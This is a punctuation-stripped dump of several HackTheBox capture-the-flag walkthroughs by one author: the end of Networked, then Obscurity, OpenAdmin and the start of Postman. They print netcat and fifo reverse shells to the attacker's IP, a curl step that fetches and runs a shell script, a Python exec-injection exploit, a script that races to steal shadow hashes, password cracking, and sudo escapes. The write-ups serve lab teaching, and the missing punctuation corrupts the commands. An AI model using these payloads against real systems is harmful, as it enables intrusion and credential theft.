sourcing technique httpsseclistsorgfulldisclosure2019Apr24 Sounds exactly what we need since the changenamesh script edit the NAME value with user input string And now I understand why the Networked name was chosen Lets give it a try First we open a new listener bash hg8archbook nc l vv p 8599 Listening on any address 8599 bash gulynetworked sudo usrlocalsbinchangenamesh interface NAME nc e binsh 10101010 8599 wrong input try again interface NAME C Alright that couldnt be that easy The input is filtered The rule is the following bash regexpazAZ09 This regex doesnt seems that bad we can still use spaces and To be honest at this point it gets really easy to overthink the solution which is quite simple in the end Call to an external script should perfectly work bash gulynetworked echo nc e binsh 10101010 8599 tmphg8 gulynetworked chmod x tmphg8 gulynetworked tmp sudo usrlocalsbinchangenamesh interface NAME binbash tmphg8 interface PROXYMETHOD hg8 interface BROWSERONLY hg8 interface BOOTPROTO hg8 And bingo a connection open on our listener bash hg8archbook nc l vv p 8599 Listening on any address 8599 Connection from 10101014646502 rootnetworked id uid0root gid0root groups0root rootnetworked cat roottxt 0a8ecxxxxxxxxxxxxxcb82 I had a lot of fun with this box and learned a few new things I hope this writeup could help you too As always do not hesitate to contact me for any questions or feedbacks See you next time hg8"},{"title":"Obscurity - HackTheBox","tags":["hackthebox","ctf","obscurity","python","custom-exploitation","encryption","re","john"],"href":"/posts/obscurity","content":"Just finished the newly released Obscurity box on Hackthbox I have to say it was a really cool box that required a lot of custom exploitation and cover various topics such as command injection a little crypto and misconfigurations I wouldnt say its an easy one but its a pretty good one for developers comfortable with Python and want to level up in CTF TlDr The user flag consisted in grabbing the source code of the server running port 80 reverse engineer it to find a command injection flaw in its workflow From there you achieve remote code execution as wwwdata As wwwdata you can access Robert user home directory filed with a encrypted password reminder file and a homemade python encryption script Reversing this script you can recover the password used to encrypt the password reminder file Once decrypted you use this password in the file to pivot to Robert user and grab the flag The root flag was accessible by abusing another homemade python script used to get a shell as root when reverse engineer it you discover the script temporary store all users password hashes to the tmp folder when running but immediately deletes them You can write a script to grab the hashes fast enough before they get deleted crack the hash of root and connect with the root account to grab the flag Alright Lets get into the details now First thing first lets add the box IP to the host file bash hg8archbook echo 101010168 obscurityhtb etchosts and lets start User Flag Recon Lets start with the classic nmap scan to see which ports are open on the box bash nmap sV sT sC obscurityhtb Starting Nmap 780 httpsnmaporg at 20191226 0956 CET Nmap scan report for obscurityhtb 101010168 Host is up 0038s latency Not shown 996 filtered ports PORT STATE SERVICE VERSION 22tcp open ssh OpenSSH 76p1 Ubuntu 4ubuntu03 Ubuntu Linux protocol 20 80tcp closed http 8080tcp open httpproxy BadHTTPServer 9000tcp closed cslistener Service Info OS Linux CPE cpeolinuxlinuxkernel Nmap done 1 IP address 1 host up scanned in 1609 seconds Bit less classic than usual port 80 is closed nmap return 9000 port which is closed no idea what this is so we keep it in mind for later maybe The ssh port 22 is open and the 8080 one running BadHTTPServer Intriguing Lets dig it on this bad server Opening httpobsurityhtb8080 display the following website obscurityhttpsuserimagesgithubusercontentcom907674771549328fee0f40029bb11ea9df781ea1b4d4ae6png Looking around we notice this interesting message Message to server devs the current source code for the web server is in SuperSecureServerpy in the secret development directory Well since we dont have other entry point yet lets try to bruteforce our way to find this secret directory name This time I decided to give ffufhttpsgithubcomffufffuf a fast web fuzzer written in Go a try Its usage is pretty straightforward and similar to wfuzz bash hg8archbook ffuf w SecListsDiscoveryWebContentbigtxt u httpobscurityhtb8080FUZZSuperSecureServerpy v10rc1 Method GET URL httpobscurityhtb8080FUZZSuperSecureServerpy develop Status 200 Size 5892 Words 1806 Lines 171 Progress 2047020470 222 reqsec Duration 00132 Errors 0 Got it The secret directory was develop Lets open this SuperSecureServerpy to take a look import socket import threading from datetime import datetime import sys import os import mimetypes import urllibparse import subprocess respTemplate HTTP11 statusNum statusCode Date dateSent Server server LastModified modified ContentLength length ContentType contentType Connection connectionType body DOCROOT DocRoot CODES 200 OK 304 NOT MODIFIED 400 BAD REQUEST 401 UNAUTHORIZED 403 FORBIDDEN 404 NOT FOUND 500 INTERNAL SERVER ERROR MIMES txt textplain csstextcss htmltexthtml png imagepng jpgimagejpg ttfapplicationoctetstreamotfapplicationoctetstream wofffontwoff woff2 fontwoff2 jsapplicationjavascriptgzapplicationzip pytextplain map applicationoctetstream class Response def initself kwargs selfdictupdatekwargs now datetimenow selfdateSent selfmodified nowstrftimea d b Y HMS def stringResponseself return respTemplateformatselfdict class Request def initself request selfgood True try request selfparseRequestrequest selfmethod requestmethod selfdoc requestdoc selfvers requestvers selfheader requestheader selfbody requestbody except selfgood False def parseRequestself request req requeststriprsplitn methoddocvers req0split header req13 body req1 headerDict for param in header pos paramfind key val parampos parampos2 headerDictupdatekey val return method method doc doc vers vers header headerDict body body class Server def initself host port selfhost host selfport port selfsock socketsocketsocketAFINET socketSOCKSTREAM selfsocksetsockoptsocketSOLSOCKET socketSOREUSEADDR 1 selfsockbindselfhost selfport def listenself selfsocklisten5 while True client address selfsockaccept clientsettimeout60 threadingThreadtarget selflistenToClientargs clientaddressstart def listenToClientself client address size 1024 while True try data clientrecvsize if data Set the response to echo back the recieved data req Requestdatadecode selfhandleRequestreq client address clientshutdown clientclose else raise errorClient disconnected except clientclose return False def handleRequestself request conn address if requestgood try printstrrequestmethod strrequestdoc end printfrom 0formataddress0 except Exception as e printe document selfserveDocrequestdoc DOCROOT statusNumdocumentstatus else document selfserveDocerrors400html DOCROOT statusNum400 body documentbody statusCodeCODESstatusNum dateSent server BadHTTPServer modified length lenbody contentType documentmime Try and identify MIME type from string connectionType Closed resp Response statusNumstatusNum statusCodestatusCode dateSent dateSent server server modified modified length length contentType contentType connectionType connectionType body body data respstringResponse if not data return 1 connsenddataencode return 0 def serveDocself path docRoot path urllibparseunquotepath try info output Document Keep the output for later debug execinfoformatpath This is how you do string formatting right cwd ospathdirnameospathrealpathfile docRoot ospathjoincwd docRoot if path path indexhtml requested ospathjoindocRoot path1 if ospathisfilerequested mime mimetypesguesstyperequested mime mime if mime0 None else texthtml mime MIMESrequestedsplit1 try with openrequested r as f data fread except with openrequested rb as f data fread status 200 else errorPage ospathjoindocRoot errors 404html mime texthtml with openerrorPage r as f data freadformatpath status 404 except Exception as e printe errorPage ospathjoindocRoot errors 500html mime texthtml with openerrorPage r as f data fread status 500 return body data mime mime status status The source code is worth reading taking a bit of time to understand give some really interesting insight on the working of this http server Remote Code Execution wwwdata shell If you are used to python development and ctf a line should quickly catch your eye execinfoformatpath As a reminded exechttpsdocspythonorg3libraryfunctionshtmlexec dynamically execute Python code passed as argument Like eval its usage is dangeroushttpsnedbatcheldercomblog201206evalreallyisdangeroushtml and open door to injections Lets see if we can use this flow to achieve remote code execution on the server Can we inject code in info variable info output Document Nope path then def parseRequestself request req requeststriprsplitn methoddocvers req0split def handleRequestself request conn address if requestgood document selfserveDocrequestdoc DOCROOT def serveDocself path docRoot path urllibparseunquotepath As we could have have guess path contains the url requested to the server and good news for us no sanitization is being made In the same way as SQL injection lets try to inject Python code that will lead to remote code injection on the server Lets create a simplified script to do so with information we have import os path inputCommand to execute info output Document printinfoformatpath So lets see what would happen if we pass an os command as path Lets try with ossystemsleep 5 bash hg8archbook python injectionpy Command to execute ossystemsleep 5 output Document ossystemsleep 5 This is not going to work we will need to escape the python command lets give it another try bash hg8archbook python injectionpy Command to execute ossystemsleep 5 output Document ossystemsleep 5 Looks good to me and doesnt throw error lets add the same exec than in the original to make sure the injection will work properly against the server import os path ossystemsleep 5 info output Document execinfoformatpath And lets run it if it hang for 5 seconds then it mean our injection was successful bash hg8archbook time python injectionpy python tmppy 002s user 001s system 0 cpu 5029 total It worked perfectly Lets now gather everything we know to achieve remote code execution on the server import os import requests url httpobscurityhtb8080ossystem while True cmd inputCommand to execute r requestsgeturlformatcmd We will try to execute a reserve shell After having no luck getting the classical netcat nor python reverse shell to work which is strange since we know python is running on the box I managed to get the fifo netcathttpswwwgnucitizenorgblogreverseshellwithbashcomment127498 reverse shell to work bash hg8archbook cat hg8sh rm tmphmkfifo tmphcat tmphbinsh i 21nc 10101010 8585 tmph hg8archbook python m httpserver Serving HTTP on 0000 port 8000 http00008000 Then we open our listener bash hg8archbook nc l vv p 8585 Listening on any address 8585 And finally we send our payload bash hg8archbook python rcepy Command to execute curl 101010108000hg8sh o tmphg8sh Command to execute bash tmphg8sh Aand we get the connection bash hg8archbook nc l vv p 8585 Listening on any address 8585 Connection from 10101016843378 id uid33wwwdata gid33wwwdata groups33wwwdata Note Looking around we immediately notice that the python bin used is pyhton3 thats why the common python shell wasnt working As usual its easy to overlook simple blockers like this one Pivot wwwdata Robert Quick recon shows that the user is robert and have a few interesting files we can read bash wwwdataobscure ls l homerobert ls l homerobert total 24 drwxrxrx 2 root root 4096 Dec 2 0947 BetterSSH rwrwr 1 robert robert 94 Sep 26 2308 checktxt rwrwr 1 robert robert 185 Oct 4 1501 outtxt rwrwr 1 robert robert 27 Oct 4 1501 passwordremindertxt rwxrwxrx 1 robert robert 2514 Oct 4 1455 SuperSecureCryptpy rwx 1 robert robert 33 Sep 25 1412 usertxt passwordremindertxt sure looks interesting Lets check it out bash wwwdataobscurehomerobert cat passwordremindertxt k Its encrypted What else do we have Lets see for checktxt and outtxt bash wwwdataobscurehomerobert cat checktxt Encrypting this file with your key should result in outtxt make sure your key is correct wwwdataobscurehomerobert cat outtxt v Thats interesting checktxt explain that encrypting this same file will result in outtxt with a given key We have both clear text message and its encrypted version Something also catch my eye Did you notice that the encrypted version contain the same number of characters and the same spaces placement than the clear text one We can say with confidence that the encryption mechanism seems to simply encrypt each letter one by one using the key somehow Lets see if we can find more informations and possibly retrieve the key If we find the key we can decipher the passwordremindertxt that will allow us to progress We didnt take a look at SuperSecureCryptpy its easy to guess that its the script used to encrypt those file This is the script import sys import argparse def encrypttext key keylen lenkey keyPos 0 encrypted for x in text keyChr keykeyPos newChr ordx newChr chrnewChr ordkeyChr 255 encrypted newChr keyPos 1 keyPos keyPos keylen return encrypted def decrypttext key keylen lenkey keyPos 0 decrypted for x in text keyChr keykeyPos newChr ordx newChr chrnewChr ordkeyChr 255 decrypted newChr keyPos 1 keyPos keyPos keylen return decrypted parser argparseArgumentParserdescriptionEncrypt with 0bscuras encryption algorithm parseraddargumenti metavarInFile typestr helpThe file to read requiredFalse parseraddargumento metavarOutFile typestr helpWhere to output the encrypteddecrypted file requiredFalse parseraddargumentk metavarKey typestr helpKey to use requiredFalse parseraddargumentd actionstoretrue helpDecrypt mode args parserparseargs banner n banner BEGINNING n banner SUPER SECURE ENCRYPTOR n banner n banner n banner FILE MODE n banner printbanner if argso None or argsk None or argsi None printMissing args else if argsd printOpening file 0formatargsi with openargsi r encodingUTF8 as f data fread printDecrypting decrypted decryptdata argsk printWriting to 0formatargso with openargso w encodingUTF8 as f fwritedecrypted else printOpening file 0formatargsi with openargsi r encodingUTF8 as f data fread printEncrypting encrypted encryptdata argsk printWriting to 0formatargso with openargso w encodingUTF8 as f fwriteencrypted Lets break it down to better understand how it works parser argparseArgumentParserdescriptionEncrypt with 0bscuras encryption algorithm parseraddargumenti metavarInFile typestr helpThe file to read requiredFalse parseraddargumento metavarOutFile typestr helpWhere to output the encrypteddecrypted file requiredFalse parseraddargumentk metavarKey typestr helpKey to use requiredFalse Reading the argparse we can quickly understand whats this script will encrypt and decrypt a given file using a given key The function that interesting us is the encrypt function Why is it interesting Because we have a clear text file and its encrypted version checktxt and outtxt The encrypt function looks like this def encrypttext key keylen lenkey keyPos 0 encrypted for x in text keyChr keykeyPos newChr ordx newChr chrnewChr ordkeyChr 255 encrypted newChr keyPos 1 keyPos keyPos keylen return encrypted 12 lines taking it step by step we should have a good understanding of what it is doing Lets start The function take 2 arguments the text to encrypt and the secret key Nothing surprising yet Second third and fourth line respectively get the length of the key initialize keyPos to 0 which we can understand means key position and initialize the encrypted variable that will for sure hold the final encrypted content since its returned at the end of the function The for loop every character of the content to encrypt this seems to confirm our previous assumption that the content is encrypted letterbyletter Inside the for loop the encrypt mechanism takes place keyChr keykeyPos get the secret key letter position For example if the secret password is hg8 then at the first loop keyChr will be h second loop it will be g and third loop 8 since keyPos get incremented by one at the end of the loop Then ord function is used on the letter to encrypt Python documentationhttpsdocspythonorg3libraryfunctionshtmlord explain Given a string representing one Unicode character return an integer representing the Unicode code point of that character For example orda returns the integer 97 and ord Euro sign returns 8364 This is the inverse of chrhttpsdocspythonorg3libraryfunctionshtmlchr chr Next line is where the Magic happens Lets break it down 1 newChr ordkeyChr The integer unicode code of the character to encrypt gets added to the integer unicode code of the current key character 2 newChr ordkeyChr 255 gets the remainder from the division of the keyChr addition by 255 to make sure it doesnt not exceed the Unicode code list 3 Finally we convert the result integer of the operation back to string using chr The encrypted character then gets added to the final encrypted variable with encrypted newChr The last two lines increments the key position so that the next characters to be encrypted will be encrypted from the next character of the secret key and so on keyPos keyPos keylen will restart the key position once we are at the end of the key For example with hg8 as a key this is what will happen when keyPos is 3 python keyPos keyPos keylen keyPos 3 3 keyPos 0 keyPos will be 0 since 3 divided by 3 gets 0 as remainder Alright This seems pretty clear now and not very robust encryption I am not going to describe the decrypt function since its exactly the same but inverted Lets now focus on how from an encrypted string and its cleartext equivalent we can find back the secret key used Recovering the secret key Seeing the encrypt logic its easy to understand how to get back the key from an clear string and its encrypted equivalent Clear character Key Character Encrypted Character Key Character Encrypted Character Clear character With that in mind we are going to write a little script to recover the secret key used to encrypt checktxt to outtxt To start we will input both clear and encrypted value python clear Encrypting this file with your key should result in outtxt make sure your key is correct encrypted v Here you need to be careful when copy pasting because space of the encrypted version are not usual spaces and could mess up your script if you paste it as normal spaces Here is how it should looks like in vim for example httpsuserimagesgithubusercontentcom907674772752623f6e331003bc211ea92b6a025983eb467png Here is the final script I made def recoverkeyclear encrypt key positionclear 0 positionencrypt 0 for character in clear clearchar clearpositionclear encryptchar encryptpositionencrypt keychar chrordencryptchar ordclearchar key keychar positionclear 1 positionencrypt 1 return key clear Encrypting this file with your key should result in outtxt make sure your key is correct encrypt v key recoverkeyclear encrypt printkey Lets run it bash hg8archbook python getsecretkeypy alexandrovichalexandrovichalexandrovichalexandrovichalexandrovichalexandrovichalexandrovich Looks good The key is repeating remember keyPos keyPos keylen but we can easily see its alexandrovich Lets try to use it to decrypt passwordremindertxt bash wwwdataobscurehomerobert python SuperSecureCryptpy i passwordremindertxt o passwordremindercleartxt k alexandrovich BEGINNING SUPER SECURE ENCRYPTOR FILE MODE Opening file passwordremindertxt Encrypting Writing to passwordremindercleartxt wwwdataobscurehomerobert cat passwordremindercleartxt SecThruObsFTW Lets try to login to Robert account with this password bash hg8archbook ssh robertobscurityhtb robertobscurityhtbs password Last login Wed Jan 22 145630 2020 from 1010149 robertobscure cat usertxt exxxxxxxxxxxxxxxxxxx7 Root Flag Recon One of the first thing I do when doing recon for root is checking the sudoer file for uncommon configuration bash sudo S l Matching Defaults entries for robert on obscure envreset mailbadpass securepathusrlocalsbinusrlocalbinusrsbinusrbinsbinbinsnapbin User robert may run the following commands on obscure ALL NOPASSWD usrbinpython3 homerobertBetterSSHBetterSSHpy Interesting another homemade script And it can be run as sudo Sounds like a bad idea to me If we can find a flaw in this BetterSSHpy we will be able to escalate our privileges to root The python script is the following import sys import random string import os import time import crypt import traceback import subprocess path joinrandomchoicesstringasciiletters stringdigits k8 session user authenticated 0 try sessionuser inputEnter username passW inputEnter password with openetcshadow r as f data freadlines data psplit if in p else None for p in data passwords for x in data if not x None passwordsappendx passwordFile njoinnjoinp for p in passwords with opentmpSSHpath w as f fwritepasswordFile timesleep1 salt realPass for p in passwords if p0 sessionuser salt realPass p1split2 break if salt printInvalid user osremovetmpSSHpath sysexit0 salt 6salt realPass salt realPass hash cryptcryptpassW salt if hash realPass printAuthed sessionauthenticated 1 else printIncorrect pass osremovetmpSSHpath sysexit0 osremoveospathjointmpSSHpath except Exception as e tracebackprintexc sysexit0 if sessionauthenticated 1 while True command inputsessionuser Obscure cmd sudo u sessionuser cmdextendcommandsplit proc subprocessPopencmd stdoutsubprocessPIPE stderrsubprocessPIPE oe proccommunicate printOutput odecodeascii printError edecodeascii if lenedecodeascii 0 else print As the name suggest this script aim to serve as a replacement for SSH After reading the code we can understand the main logic is the following 1 Get the user to input username and password sessionuser inputEnter username passW inputEnter password 2 Open and parse the etcshadowhttpswwwtldporgLDPlameLAMElinuxadminmadeeasyshadowfileformatshtmlhttpswwwtldporgLDPlameLAMElinuxadminmadeeasyshadowfileformatshtml file to a temporary file in tmpSSH path joinrandomchoicesstringasciiletters stringdigits k8 with openetcshadow r as f data freadlines data psplit if in p else None for p in data passwords for x in data if not x None passwordsappendx passwordFile njoinnjoinp for p in passwords with opentmpSSHpath w as f fwritepasswordFile at this point the created tmp file should like something like this bash root 6rixxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxch4dy 111111 0 111111 1 hugo 6qpePkxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxc6RAj 111111 0 111111 1 3 Check if username exist if username dont exist the temp file get removed and the script exit for p in passwords if p0 sessionuser salt realPass p1split2 break if salt printInvalid user osremovetmpSSHpath sysexit0 4 If the username exist the password get hashed and compared to the hash in the temp file coming from etcshadow to see if they match In the end the temp file get removed wether the password was correct or not salt 6salt realPass salt realPass hash cryptcryptpassW salt if hash realPass printAuthed sessionauthenticated 1 else printIncorrect pass osremovetmpSSHpath sysexit0 osremoveospathjointmpSSHpath 5 If the password if also correct we get dropped in a pseudo shell if sessionauthenticated 1 while True command inputsessionuser Obscure cmd sudo u sessionuser cmdextendcommandsplit proc subprocessPopencmd stdoutsubprocessPIPE stderrsubprocessPIPE oe proccommunicate printOutput odecodeascii printError edecodeascii if lenedecodeascii 0 else print Alright So with all of this in mind what can of flaw can we find in that First thing that came to my mind was to edit the script to display the retrieved root hash But of course it can not be that easy we dont have write rights since the file is owned by root bash robertobscureBetterSSH ls l total 4 rwxrxrx 1 root root 1805 Oct 5 1309 BetterSSHpy Then what The temporary file catch the attention aswell If we manage to read it before it get deleted we could retrieve root user password hash We are facing two issues here 1 The file name is random 2 The file get deleted immediately after creation The script allow no pause where we could read the file before it gets deleted At this point we will need to write a script monitoring the tmpSSH folder for any file creation and grab its content as fast as possible before it get deleted To do so I wrote a simple script import os path tmpSSH before dictfile None for file in oslistdirpath while True after dictfile None for file in oslistdirpath added file for file in after if file not in before if added with openpath added0 r as newfile printnewfileread before after Basically the script will loop forever while listing file in tmpSSH if a new file is detected it will print its content Lets drop it on the server and give it a try bash robertobscure python3 tmpwatchsshpy In another shell lets run the betterSSHpy script bash robertobscure sudo usrbinpython3 homerobertBetterSSHBetterSSHpy Enter username hg8 Enter password hg8 Invalid user Going back to our script we can see it worked bash robertobscure python3 tmpwatchsshpy root 6riekpK4muBdaAyK0j9WfMzvcSKYVfyEHGtBfnfpiVbYbzbVmfbneEbo0wSijW1GQussvJSk8X1M56kzgGj8f7DFN1h4dy1 18226 0 99999 7 robert 6fZZcDG7glfO35GcjUmNs3PSjroqNGZjH35gN4KjhHbQxvWO0XUTCIHgavst7Lj8wLFxQ21jYW5nD66aJsvQSPy1zbH 18163 0 99999 7 Cracking Root password hash Now that we have the hash lets hope it can be cracked I will use john the ripper bash hg8archbook echo 6fZZcDG7glfO35GcjUmNs3PSjroqNGZjH35gN4KjhHbQxvWO0XUTCIHgavst7Lj8wLFxQ21jYW5nD66aJsvQSPy1zbH roothash hg8archbook john wordlistSecListsPasswordsLeakedDatabasesrockyoutxt roothash Press q or CtrlC to abort almost any other key for status mercedes Session completed Alright We have the root password lets try to use it with the betterSSHpy script bash sudo usrbinpython3 homerobertBetterSSHBetterSSHpy Enter username root Enter password mercedes Authed rootObscure cat rootroottxt Output 5xxxxxxxxxxxxxxxxxxxxxxxxx3 As always do not hesitate to contact me for any questions or feedbacks See you next time hg8"},{"title":"OpenAdmin - HackTheBox","tags":["hackthebox","ctf","openadmin","opennetadmin","exploit","php","shell_exec","apache","ssh","john","sudo","gtfobins"],"href":"/posts/openadmin","content":"OpenAdmin is an easy Linux based box it need a bit of exploit lot of recon pivot and a bit GTFObins to finish nice combo right While this box is rated easy I wouldnt recommend it for beginners since it require a lot a recon its easy to miss important information and can be very frustrating if you are not used to it TlDr To get the user flag you had to exploit a Remote Code Execution exploit on an outdated opennetadmin instance You get a shell as wwwdata from which you pivot to the jimmy user after finding his password in a database config file From jimmy account you pivot again to joanna account by extracting her ssh private key using a php script since the Apache web server is configured to run as user joanna and we have write rights over the Document Root folder Finally as joanna we can get the user flag The root flag was a bit less tricky and needed you to execute a shell from inside a privileged nano that joanna is allowed to run as root without password Alright lets get into it First thing first lets add the box IP to the host file bash hg8archbook echo 101010171 openadminhtb etchosts and lets start User Flag Recon Lets start with the classic nmap scan to see which ports are open on the box bash hg8archbook nmap sV sT sC openadminhtb Nmap scan report for openadminhtb 101010171 PORT STATE SERVICE VERSION 22tcp open ssh OpenSSH 76p1 Ubuntu 4ubuntu03 Ubuntu Linux protocol 20 80tcp open http Apache httpd 2429 Ubuntu Service Info OS Linux CPE cpeolinuxlinuxkernel Nmap done 1 IP address 1 host up scanned in 803 seconds We have the classic A web app running on port 80 and the SSH port 22 open Opening httpopenadminhtb display the Apache2 Ubuntu default page Apache2 Ubuntu default pagehttpsuserimagesgithubusercontentcom907674773017278cd7311003e1f11ea9b01c07b9d816af3png Nothing really interesting to see here Lets open gobuster to see if he can find some juicy files and folders bash hg8archbook gobuster dir u httpopenadminhtb w SecListsDiscoveryWebContentbigtxt Gobuster v301 by OJ Reeves TheColonial Christian Mehlmauer FireFart htpasswd Status 403 htaccess Status 403 artwork Status 301 music Status 301 serverstatus Status 403 sierra Status 301 20200123 112548 Finished Three uncommon folder here artwork and sierra are just static demo website nothing to do on it music looks like this music website hacktheboxhttpsuserimagesgithubusercontentcom9076747730176096efa62803e2011ea9f623d00bd0d24a9png Oddly enough the Login button redirect to an admin interface open admin pagehttpsuserimagesgithubusercontentcom907674773017790ac5ef0003e2011ea9efa0c4587673e66png First thing that catch the eye is this big yellow message You are NOT on the latest release version Your version v1811 Latest version Unable to determine Please DOWNLOAD the latest version We all know what outdated software means right D Selecting the DOWNLOAD link redirect to the software page which is called OpenNetAdmin At first I though the name of the box would be related to a admin page being open and easily accessible but turn out it was more a reference to the software used We have the name of the software and its version which is outdated Lets see if some already made exploits are available bash hg8archbook searchsploit opennetadmin Exploit Title Path usrshareexploitdb OpenNetAdmin 130301 Remote Code Execution exploitsphpwebapps26682txt OpenNetAdmin 1811 Command Injection Exploit Metasploit exploitsphpwebapps47772rb OpenNetAdmin 1811 Remote Code Execution exploitsphpwebapps47691sh Bingo Remote code execution on the exact version running here Should be easy right bash hg8archbook wget httpswwwexploitdbcomraw47691 o opennetadminrcesh hg8archbook bash exploitsh httpopenadminhtbona id uid33wwwdata gid33wwwdata groups33wwwdata We got a shell as wwwdata Pivot wwwdata jimmy Lets start by enumerating users bash wwwdataopenadmin ls lh home total 80K drwxrx 5 jimmy jimmy 40K Jan 24 0210 jimmy drwxrx 6 joanna joanna 40K Nov 28 0937 joanna Two users we dont have enough rights to access neither of their home folder Lets continue our enumerations One thing that often gives good results on web applications is searching for hardcoded password A little grep can do that for us bash wwwdataopenadmin grep ri pass localconfigdatabasesettingsincphp dbpasswd n1nj4W4rri0R Here is something interesting The full config file is the following php array databases array 0 array dbtype mysqli dbhost localhost dblogin onasys dbpasswd n1nj4W4rri0R dbdatabase onadefault dbdebug false description Default data context contextcolor D3DBFF Lets see if this password can work for either jimmy or joanna bash hg8archbook ssh joannaopenadminhtb joannaopenadminhtbs password Permission denied please try again joannaopenadminhtbs password hg8archbook ssh jimmyopenadminhtb jimmyopenadminhtbs password Welcome to Ubuntu 18043 LTS GNULinux 415070generic x8664 Last login Fri Jan 24 015249 2020 from 10101443 jimmyopenadmin ls jimmyopenadmin It works with jimmy Unfortunately there is no user flags here but at least we get a stable shell Pivot jimmy joanna Since we got database access I went to check if we could find juicy informations and potential other users password hash in the database bash jimmyopenadmin mysql u onasys p Enter password Welcome to the MySQL monitor Commands end with or g Server version 57280ubuntu018044 Ubuntu mysql SHOW DATABASES Database informationschema onadefault 2 rows in set 000 sec mysql USE onadefault Database changed mysql SHOW TABLES Tablesinonadefault users 40 rows in set 001 sec mysql SELECT FROM users id username password level ctime atime 1 guest 098f6bcd4621d373cade4e832627b4f6 0 20200123 101257 20200123 101257 2 admin 21232f297a57a5a743894a0e4a801fc3 0 20071030 030017 20071202 221026 2 rows in set 000 sec Two MD5 hash Quick Google search shows that 098f6bcd4621d373cade4e832627b4f6 is hash for test and 21232f297a57a5a743894a0e4a801fc3 is hash for admin Too bad no hash for joanna here Lets move on to more recon While looking around still using the awesome grep we find some interesting config files mentioning joanna bash jimmyopenadminetc grep ri joanna 2devnull passwdjoannax10011001homejoannabinbash apache2sitesavailableinternalconfAssignUserID joanna joanna sudoersdjoannajoanna ALLALL NOPASSWDbinnano optpriv The sudoersd one look perfect for a privilege escalation dont you think Lets keep this in mind for later The one that really catch my eye is the apache config Lets see the full file apacheconf Listen 12700152846 ServerName internalopenadminhtb DocumentRoot varwwwinternal AssignUserID joanna joanna ErrorLog APACHELOGDIRerrorlog CustomLog APACHELOGDIRaccesslog combined It was the first time I saw about the AssignUserID configuration Even if we can easily understand that its meant to run the apache process for this virtualhost as joanna instead of wwwdata I searched on the documentation out of curiosity to learn more about this This configuration is available through the apache2mpmitkhttpmpmitksessenet module AssignUserID Takes two parameters uid and gid or really user name and group name use if you want to specify a raw uid specifies what uid and gid the vhost will run as after parsing the request etc of course So the virtualhost for varwwwinternal document root runs as joanna If we can find a Remote Code Execution command in the PHP code in this folder by abusing an eval or uploading web shell for example then we can run commands as joanna user To be honest I missed this folder in my previous recons so lets see whats inside now php jimmyopenadmin ls l varwww drwxrxrx 6 wwwdata wwwdata 4096 Nov 22 1559 html drwxrwx 2 jimmy internal 4096 Jan 24 0311 internal jimmyopenadminvarwwwinternal ls l rwxrwxrx 1 jimmy internal 3228 Jan 24 0311 indexphp rwxrwxrx 1 jimmy internal 185 Nov 23 1637 logoutphp rwxrwxrx 1 jimmy internal 339 Nov 23 1740 mainphp Here is something interesting The internal folder is owned by our current jimmy meaning we can write anything we want in this folder I will use use the shellexec php function to try to retrieve joanna ssh private key Here is one way to do it php idrsahash hg8archbook john wordlistSecListsPasswordsLeakedDatabasesrockyoutxt idrsahash Loaded 1 password hash SSH RSADSAECOPENSSH SSH private keys 3264 bloodninjas joannaidrsa 1g 0000014 DONE 20200124 1705 007062gs 1012Kps 1012Kcs 1012KCs 7Vamos Session completed hg8archbook john show idrsahash joannaidrsabloodninjas Great we got it and its related to ninja again Lets grab our flag now bash hg8archbook ssh i joannaidrsa joannaopenadminhtb Enter passphrase for key joannaidrsa Welcome to Ubuntu 18043 LTS GNULinux 415070generic x8664 Last login Thu Jan 2 211240 2020 from 1010143 joannaopenadmin cat usertxt cxxxxxxxxxxxxxxxxxxxxxxxxxxf Root Flag Recon The recon phase wont be needed there since we already got the information we needed while searching around for user flag As a reminder bash joannaopenadmin sudo l Matching Defaults entries for joanna on openadmin envreset mailbadpass securepathusrlocalsbinusrlocalbinusrsbinusrbinsbinbinsnapbin User joanna may run the following commands on openadmin ALL NOPASSWD binnano optpriv A good habit for fast privilege escalation techniques is to check on GTFOBinshttpsgtfobinsgithubio As a reminder GTFOBins is a curated list of Unix binaries that can be exploited by an attacker to bypass local security restrictions The project collects legitimate functions of Unix binaries that can be abused to break out restricted shells escalate or maintain elevated privileges transfer files spawn bind and reverse shells and facilitate the other postexploitation tasks And of course there is an entry for nano GTFObins nanohttpsuserimagesgithubusercontentcom9076747730845687b88c4803ecd11ea8092c4d2e7eb43edpng Note R means CTRLR same for X means CTRLX Lets give it a try bash joannaopenadmin sudo binnano optpriv RX reset sh 10 20 id uid0root gid0root groups0root cat rootroottxt 2xxxxxxxxxxxxxxxxxxxxxxxx1 As always do not hesitate to contact me for any questions or feedbacks See you next time hg8"},{"title":"Postman - HackTheBox","tags":["hackthebox","ctf","postman","gobuster","webmin","redis","cve-2019-12840","ssh","john"],"href":"/posts/postman","content":"Postman was an easy rated box It was quite quick but nice to solve It can be really interesting if you want to learn and play with the now widely used Redis TlDr The user flag consisted in exploiting a redis instance accessible without authentication From this instance you would bruteforce the passphrase of a SSH key found in a backup folder and use its password to pivot from redis user to Matt user Using the same password we could login to a Webmin panel and use an exploit CVE201912840 to achieve remote commands execution as root and grab the flag Alright lets get into it First thing first lets add the box IP to the host file bash hg8archbook echo 101010160 postmanhtb etchosts and lets start User flag Recon Lets start with the classic nmap scan to see which ports are open on the box bash hg8archbook nmap sV sT sC postmanhtb Starting Nmap 780 httpsnmaporg at 20191222 2034 CET Nmap scan report for postmanhtb 101010160 PORT STATE SERVICE VERSION 22tcp open ssh OpenSSH 76p1 Ubuntu 4ubuntu03 Ubuntu Linux protocol 20 80tcp open http Apache httpd 2429 Ubuntu httptitle The Cyber Geeks Personal Website 10000tcp open sslhttp MiniServ 1910 Webmin httpd sslcert Subject commonNameorganizationNameWebmin Webserver on Postman Service Info OS Linux CPE cpeolinuxlinuxkernel Nmap done 1 IP address 1 host up scanned in 4641 seconds We have the classic A web app running on port 80 and the SSH port 22 open We also have a Webmin server running on port 10000 Opening httppostmanhtb display the following website postman websitehttpsuserimagesgithubusercontentcom90767477132694307d84e00250211ea904d67647430f4dcpng While httpspostmanhtb10000 display the classical Webmin login page postman webminhttpsuserimagesgithubusercontentcom907674771326975af558080250211ea9618f52af748ddf7png Starting from therewell There isnt anything interesting I run into a lot of rabbit holes without being able to find anything In particularly I tried running exploits against the Webmin instance including the infamous CVE201915107 Remote Code Execution via Password Reset 